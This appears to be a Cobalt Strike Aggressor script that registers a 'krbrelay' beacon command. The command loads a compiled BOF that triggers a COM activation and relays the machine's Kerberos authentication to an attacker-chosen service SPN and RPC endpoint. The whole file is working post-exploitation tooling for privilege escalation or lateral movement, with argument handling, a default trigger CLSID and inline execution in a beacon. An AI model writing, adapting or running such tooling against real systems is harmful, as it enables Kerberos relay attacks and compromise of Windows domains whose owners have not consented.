println("[+] Loaded KrbRelay reusable single-activation BOF v37-neg2");

beacon_command_register(
    "krbrelay",
    "Run one fresh COM activation and relay its machine Kerberos exchange",
    "Usage: krbrelay <relay_port> <service_spn> <rpc_endpoint> [relay_host] [trigger_clsid]"
);

alias krbrelay {
    local('$packed $object $handle $trigger $relay_host');

    if (size(@_) < 4 || size(@_) > 6) {
        berror($1, "Usage: krbrelay <relay_port> <service_spn> <rpc_endpoint> [relay_host] [trigger_clsid]");
        return;
    }

    if (barch($1) ne "x64") {
        berror($1, "krbrelay requires an x64 Beacon");
        return;
    }

    $handle = openf(script_resource("bof/krbrelay.x64.o"));
    $object = readb($handle, -1);
    closef($handle);

    $relay_host = "127.0.0.1";
    $trigger = "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}";

    if (size(@_) == 5) {
        if (substr($5, 0, 1) eq "{") {
            $trigger = $5;
        } else {
            $relay_host = $5;
        }
    }
    if (size(@_) == 6) {
        $relay_host = $5;
        $trigger = $6;
    }

    $packed = bof_pack($1, "zizzzz", $relay_host, int($2), $3, "127.0.0.1", $4, $trigger);
    btask($1, "Running reusable single-activation Kerberos relay BOF v37 [relay=" . $relay_host . "]");
    beacon_inline_execute($1, $object, "go", $packed);
}
